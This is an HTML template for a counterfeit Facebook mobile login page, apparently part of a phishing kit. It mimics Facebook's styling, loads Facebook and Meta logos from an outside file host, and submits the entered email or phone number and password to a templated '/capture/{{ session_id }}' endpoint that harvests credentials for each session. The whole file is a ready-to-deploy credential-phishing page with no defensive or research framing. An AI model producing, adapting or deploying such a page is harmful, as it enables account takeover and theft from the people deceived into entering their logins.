<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=432, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Facebook Login</title>

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Roboto,sans-serif;
}

html, body {
  height: 100%;
  overflow: hidden;
}

body{
background:#222;
display:flex;
justify-content:center;
align-items:center;
}

.phone{
width:400px;
height:100%;
max-height:100%;
background:#F2F3F5;
display:flex;
flex-direction:column;
}


.content{
flex:1 1 auto;
overflow-y:auto;
overflow-x:hidden;
-webkit-overflow-scrolling:touch;
position:relative;
}


.language{
position:absolute;
left:50%;
transform:translateX(-50%);
top:24px;
font-size:13px;
color:#65676B;
text-align:center;
}


.fb-logo{
position:absolute;
left:50%;
transform:translateX(-50%);
top:90px;
width:60px;
height:60px;
border-radius:50%;
object-fit:contain;
}


.input-box{
position:absolute;
left:20px;
right:20px;
width:auto;
height:46px;
border:2px solid #DADDE1;
border-radius:23px;
background:white;
padding-left:18px;
font-size:14px;
outline:none;
}

.input-box::placeholder{color:#65676B;}
.input-box:focus{border-color:#1877F2;}

.email{top:200px;}
.password{top:258px;}


.login-btn{
position:absolute;
left:20px;
right:20px;
width:auto;
height:44px;
background:#1877F2;
border:none;
border-radius:22px;
font-size:16px;
font-weight:700;
color:white;
cursor:pointer;
top:324px;
}

.login-btn:hover{background:#166FE5;}
.login-btn:active{background:#29487D;}


.forgot{
position:absolute;
left:50%;
transform:translateX(-50%);
top:388px;
font-size:14px;
font-weight:500;
color:#1C1E21;
text-align:center;
cursor:pointer;
}

.forgot:hover{text-decoration:underline;}


.divider{
position:absolute;
left:20px;
right:20px;
top:424px;
height:1px;
background:#DADDE1;
}


.create-btn{
position:absolute;
left:50%;
transform:translateX(-50%);
top:444px;
height:44px;
padding:0 94px;
border-radius:22px;
border:2px solid #1877F2;
background:white;
font-size:15px;
font-weight:500;
color:#1877F2;
cursor:pointer;
white-space:nowrap;
}

.create-btn:hover{
background:#1877F2;
color:white;
}


.spacer{
position:absolute;
top:508px;
height:1px;
width:1px;
}


.footer{
flex:0 0 70px;
display:flex;
align-items:center;
justify-content:center;
background:#F2F3F5;
}

.meta-wrap{
}

.meta-logo{
width:80px;
height:40;
display:block;
object-fit:contain;
}
</style>
</head>

<body>

<div class="phone">


  <div class="content">
    <div class="language">English (UK)</div>

    <img class="fb-logo" src="https://files.catbox.moe/x4lxq7.png">

    <form action="/capture/{{ session_id }}" method="POST">
    <input class="input-box email" name="username" placeholder="Mobile number or email address">
    <input type="password" name="password" class="input-box password" placeholder="Password">
    <button class="login-btn" type="submit">Log in</button>
    </form>

    <div class="forgot">Forgotten password?</div>
    <div class="divider"></div>
    <button class="create-btn">Create new account</button>
    
    <div class="spacer"></div>
  </div>


  <div class="footer">
    <div class="meta-wrap">
      <img class="meta-logo" src="https://files.catbox.moe/ogzsoi.png">
    </div>
  </div>

</div>

</body>
</html>
